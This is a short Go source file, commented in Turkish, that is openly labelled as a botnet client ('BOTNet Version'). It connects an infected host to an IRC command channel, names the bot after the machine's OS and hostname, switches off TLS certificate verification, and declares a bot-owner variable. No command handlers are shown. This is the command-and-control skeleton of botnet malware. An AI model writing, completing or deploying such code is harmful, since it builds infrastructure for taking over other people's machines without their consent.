package main

import (
	"crypto/tls"
	"fmt"
	"os"
	"runtime"

	"github.com/thoj/go-ircevent"
)

var channel string
var serverssl string
var botOwner string

//VERSION BOTNet Version
const VERSION = "v1"

//ConnectToIRC IRC'ye bağlanır
func ConnectToIRC(debug bool) *irc.Connection {
	ircname, err := os.Hostname()
	if err != nil {
		ircname = "Bilinmiyor"
	}
	irccon := irc.IRC(string(runtime.GOOS), ircname)
	irccon.Debug = debug
	irccon.UseTLS = true
	irccon.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	irccon.AddCallback("001", func(e *irc.Event) { irccon.Join(channel) })
	irccon.AddCallback("JOIN", onJoin)
	connectionerr := irccon.Connect(serverssl)
	if connectionerr != nil {
		fmt.Printf("Hata %s", err)
	}
	return irccon
}

func onJoin(e *irc.Event) {
	fmt.Println("Giriş Başarılı")
}
